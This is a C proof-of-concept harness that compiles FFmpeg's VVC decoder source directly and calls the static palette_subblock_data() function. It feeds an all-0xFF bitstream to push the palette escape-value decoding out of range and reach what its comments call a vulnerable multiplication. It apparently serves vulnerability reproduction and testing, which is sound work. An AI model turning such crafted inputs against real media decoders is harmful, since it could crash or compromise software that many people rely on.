#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>

#include "libavcodec/cabac.h"
#include "libavcodec/cabac_functions.h"

/* Pull in the actual (unmodified) target translation unit so we call the
 * real, static palette_subblock_data() function and hit the real
 * vulnerable multiplication line, rather than re-implementing any logic. */
#include "/work/libavcodec/vvc/ctu.c"

int main(void)
{
    static VVCLocalContext lc;
    static VVCFrameContext fc;
    static VVCSPS sps;
    static H266RawSPS rsps;
    static SliceContext sc;
    static H266RawSliceHeader rsh;
    static CodingUnit cu;
    static TransformUnit tu;
    static EntryPoint ep;
    static int coeff_buf[64];

    uint8_t buf[64];
    uint8_t run_type[16];
    uint8_t index[16];
    int prev_run_pos = 0;
    bool adjust = false;

    memset(run_type, 0, sizeof(run_type));
    memset(index, 0, sizeof(index));

    /* All-0xFF bypass-coded bitstream: the VVC CABAC bypass decoder yields
     * a run of leading '1' bits from this, which drives the k-th order
     * Exp-Golomb decoder used for the palette escape value out of range,
     * forcing ff_vvc_palette_escape_val() to signal an error/huge value. */
    memset(buf, 0xFF, sizeof(buf));

    memset(&rsps, 0, sizeof(rsps));
    rsps.sps_min_qp_prime_ts = 0;

    memset(&sps, 0, sizeof(sps));
    sps.r = &rsps;
    sps.bit_depth = 8;
    sps.qp_bd_offset = 0;
    sps.log2_transform_range = 15;
    sps.pixel_shift = 0;

    memset(&rsh, 0, sizeof(rsh));
    rsh.sh_dep_quant_used_flag = 0;

    memset(&sc, 0, sizeof(sc));
    sc.sh.r = &rsh;

    memset(&fc, 0, sizeof(fc));
    fc.ps.sps = &sps;

    memset(&cu, 0, sizeof(cu));
    cu.cb_width = 4;
    cu.cb_height = 4;
    cu.tree_type = SINGLE_TREE;
    cu.plt[0].size = 0; /* esc == 0 */
    cu.tus.head = &tu;

    memset(&tu, 0, sizeof(tu));
    tu.nb_tbs = 1;
    tu.tbs[0].c_idx = 0;
    tu.tbs[0].tb_width = 4;
    tu.tbs[0].tb_height = 4;
    tu.tbs[0].log2_tb_width = 2;
    tu.tbs[0].log2_tb_height = 2;
    tu.tbs[0].coeffs = coeff_buf;

    memset(&lc, 0, sizeof(lc));
    lc.cu = &cu;
    lc.fc = &fc;
    lc.sc = &sc;

    memset(&ep, 0, sizeof(ep));
    ff_init_cabac_decoder(&ep.cc, buf, sizeof(buf));
    lc.ep = &ep;

    int ret = palette_subblock_data(&lc, /*max_index=*/0, /*subset_id=*/0,
                                     /*transpose=*/false, run_type, index,
                                     &prev_run_pos, &adjust);
    printf("palette_subblock_data returned %d\n", ret);
    return 0;
}
